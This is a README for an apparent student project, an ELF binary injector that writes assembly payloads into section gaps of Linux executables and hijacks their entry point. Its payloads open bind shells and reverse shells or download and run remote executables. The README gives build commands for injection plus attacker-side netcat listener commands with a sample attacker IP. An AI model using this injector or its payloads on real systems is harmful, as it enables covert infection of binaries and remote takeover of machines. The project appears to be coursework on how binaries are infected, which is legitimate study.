# Elf on the Shelf

### Advent of Coders

Alex Shao, Daniel Yang, Owen Zeng

### Project Description:

Executable binaries can be stored in a format known as ELF, and this is what Linux uses.
An ELF is essentially a file with different sections each with a different purpose, and it has a table that the OS will use as a map.
This map will point to different sections, and it happens that sometimes these sections have gaps between them.
These gaps will have zeroed out bytes that aren't used and this is where the injector will copy bytes from a payload into the target binary.
It will change the entry point of the ELF (which is where the OS will go to start executing instructions) to the payload,
and it will add an instruction to jump back to the original entry point after the payload is executed.
This will run the payload first and then the original binary.

### Instructions:

This is meant to be run on Linux as other operating systems use different executable formats.

Dependencies:
- gcc
- objcopy
- ld 
- nasm
- make
- awk

Please also note that the payloads are written for the x86_64 architecture.
Running these on ARM will not work unless you use an emulator.

#### Quickstart

To run the default injection with the exec.asm payload, run:

```bash
$ make
```

This will compile the injector, a no pie test binary, and the payload.
It will run the injector to attach the payload to the target.

To test run:

```bash
$ ./target
```

You should see both the message you would've received from an untouched target binary ("TESTING BINARY FOR INJECTION"),
as well as the output for the command `ls -lah`.

If you want to see the behavior of the original target (before infection), run

```bash
$ make target
```

And then:

```bash
$ ./target
```

#### Custom Injection

Before you start injection, you must pick a payload to inject and figure out how to use it.
Looking at the section below will give you information on how to compile the .bin files whose contents will be injected into the file.
You must also follow the instructions on how to exploit this payload once it's running.
For example, the download.bin payload will not work if there's no machine listening on a port to send it a file.

To customize your injection you can use the following parameters:

- VERBOSE: set to 1 to see detailed logs
- ASM: set the path to the payload source file (default: payloads/exec.asm)
- IP: set the address for reverse_shell and download
- PORT: set the port for reverse_shell, download, and bind_shell (default: 9000)
- BINARY: specify what binary to inject
- PIE: if a binary isn't specified then the test binary will be compiled with no-pie unless PIE=1

An example of a custom injection can be:

```bash
$ make BINARY=hello_world ASM=payloads/reverse_shell.asm IP=192.168.1.11 PORT=31337 VERBOSE=1
```

where the target binary `hello_world` is injected with a reverse shell that will connect to the attacker machine at 192.168.1.11 using port 31337.

#### Payloads

To try your own payloads, you can write a program in assembly.
Your payload must end with a `jmp original` instruction where `original: ` is a label at the end of the file.
The injector will append a jump instruction to go back to the original entry point.

You can use the test_payload target to test the payload before running it with the injector.

The following are what each payload does and how to use them:


**exec.asm**

This will execute `ls -lah` to print all the files.
It can be tested using the following command:

```bash
$ make test_payload ASM=payloads/exec.asm
```

<br>

**bind_shell.asm**

This will open a TCP socket at a port specified by the PORT parameter (or 9000 by default).
From an attacker shell, you can connect to the machine's ip with the port and get a bind shell.

```bash
$ make test_payload ASM=payloads/bind_shell.asm PORT=8888
```

From the attacking shell connect using the following command (which assumes attacking shell is on the target machine):

```bash
$ nc localhost 8888
```

Otherwise replace localhost with the IP of the target machine.

<br>

**reverse_shell.asm**

This will connect to a TCP port on an attacking machine using the specified IP and PORT parameters.
From an attacker shell, you must listen using something like netcat:

```bash
$ nc -lvnp 8888
```

And the payload can be tested with the following command (which assumes the attacking machine ip is 192.168.1.11):

```bash
$ make test_payload ASM=payloads/reverse_shell.asm IP=192.168.1.11 PORT=8888
```

<br>

**download.asm**

This will download any executable payload (maximum 4096 bytes) using the specified IP and PORT parameters.
The attacking shell must listen with a file as such:

```bash
$ nc -l 8888 < scary_stuff.sh
```

An example file could be a bash script that will echo the date into a file in /tmp to show proof of execution.

The payload can be tested like so:

```bash
$ make test_payload ASM=payloads/download.asm IP=192.168.1.11 PORT=8888
```

This assumes the attacking machine's ip is 192.168.1.11

#### Cleanup

To get rid of any binaries, use the following command:

```bash
$ make clean
```

### Resources/ References:

http://ouah.org/elf-pv.txt

https://hckng.org/~isra/articles/house-of-pain.html

https://www.man7.org/linux/man-pages/

https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/

https://www.exploit-db.com/shellcodes

[![assignment due date](https://classroom.github.com/assets/deadline-readme-button-22041afd0340ce965d47ae6ef1cefeee28c7c493a6346c4f15d667ab976d596c.svg)](https://classroom.github.com/a/B2vtqcJe)
